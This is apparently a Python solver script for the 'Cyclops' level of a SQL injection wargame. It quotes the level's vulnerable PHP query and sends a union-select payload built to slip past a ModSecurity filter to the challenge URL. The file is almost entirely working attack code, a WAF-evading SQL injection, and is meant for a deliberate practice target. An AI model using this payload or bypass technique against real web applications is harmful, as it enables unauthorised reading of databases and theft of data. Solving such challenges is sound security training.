#!/usr/bin/env python3
import los
import los_cookies as lc


def main():
    """
    Cyclops 36

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
    $query = "select id,pw from prob_cyclops where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if(($result['id'] === "first") && ($result['pw'] === "second")) solve("cyclops");
    //must use union select
    highlight_file(__FILE__);
    """

    url = "https://modsec.rubiya.kr/chall/cyclops_9d6a565d1cb6c38a06a6b0815344e29e.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'pw'

    payload = "'<@=1 union/**/select 'first','second'#"
    p = los.SqlInjection(url, cook, method, inj_param, payload)

    response = p.my_request()
    if 'Clear!' in response:
        print('\nCyclops Clear!')


if __name__ == '__main__':
    main()
